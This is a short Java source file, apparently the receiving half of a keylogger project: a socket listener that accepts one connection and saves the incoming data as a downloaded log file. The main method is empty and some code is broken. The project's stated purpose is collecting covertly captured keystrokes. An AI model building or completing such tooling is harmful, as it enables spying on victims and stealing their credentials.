package keylogger_cliente;

import java.io.BufferedOutputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.ServerSocket;
import java.net.Socket;

public class clienteMain {

	public static void main(String[] args) {
		// TODO Auto-generated method stub

	}

}


class portlisten{
	private int puerto;
	private int bytesRead;
	private int current = 0;
	private FileOutputStream fos = null;
	private BufferedOutputStream bos = null;
	private ServerSocket servsock = null;
	private Socket sock = null;

	public void porlisten(int p){
		puerto = p;
	}

	public void descargaArchivo(){

		try {
			servsock = new ServerSocket(puerto);
			sock = servsock.accept();
			byte [] mybytearray  = new byte [6000000];
			InputStream is = sock.getInputStream();
			fos = new FileOutputStream("C:\\User\\juanc\\Documents\\Downloaded-log.txt");
			bos = new BufferedOutputStream(fos);
			bytesRead = is.read(mybytearray,0,mybytearray.length);
			current = bytesRead;			
			do {
				bytesRead = is.read(mybytearray, current, (mybytearray.length-current));
				if(bytesRead >= 0) current += bytesRead;
			} while(bytesRead > -1);

			bos.write(mybytearray, 0 , current);
			bos.flush();
			
			
		} catch (IOException e) {

		}

	}
}

